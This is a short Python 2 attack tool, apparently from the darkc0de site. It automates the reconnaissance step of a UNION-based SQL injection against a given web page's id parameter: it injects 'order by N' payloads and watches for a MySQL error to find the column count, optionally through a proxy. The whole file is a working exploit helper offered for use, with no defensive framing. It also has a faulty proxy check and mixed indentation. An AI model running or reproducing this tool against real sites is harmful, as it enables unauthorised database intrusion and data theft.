#!/usr/bin/python 
#Column length tester. (300 max) 
 
#www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
 
#Fill in the error your receiving here. 
ERROR = "mysql_fetch_assoc()" 
#Add proxy support: Format 127.0.0.1:8080
proxy = "None" 
 
import urllib, urllib2, sys, re, httplib, socket 
 
if len(sys.argv) != 2: 
	print "\n\tUsage: ./orderby.py <site>" 
	print "\n\tEx: ./orderby.py www.site.com/index.php?id=\n" 
	sys.exit(1) 
 
site = sys.argv[1] 
if site[:7] != "http://": 
	site = "http://"+site 
if site[-1:] != "=": 
	print "\n[-] Site must end with \'=\'\n" 
	sys.exit(1) 
 
try: 
	if proxy != "None" or proxy != "": 
		print "\n[+] Testing Proxy..." 
		h2 = httplib.HTTPConnection(proxy) 
		h2.connect() 
		print "[+] Proxy:",proxy 
		print "[+] Building Handler" 
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'}) 
	else: 
		print "\n[-] Proxy Not Given" 
		proxy_handler = "" 
except(socket.timeout): 
	print "\n[-] Proxy Timed Out" 
	sys.exit(1) 
except: 
	print "\n[-] Proxy Failed" 
	sys.exit(1) 
 
for num in xrange(1,300): 
	num = str(num) 
	print "[+] Testing:",num 
	opener = urllib2.build_opener(proxy_handler)
	source = opener.open(site+"-1+order+by+"+num+"/*").read() 
     	if re.search(ERROR,source): 
    		 print "\n\t[!] Column Length Found:",int(num)-1 
		 print "\t[!] Site:",site+"-1+order+by+"+str(int(num)-1)+"/*\n" 
		 sys.exit(1)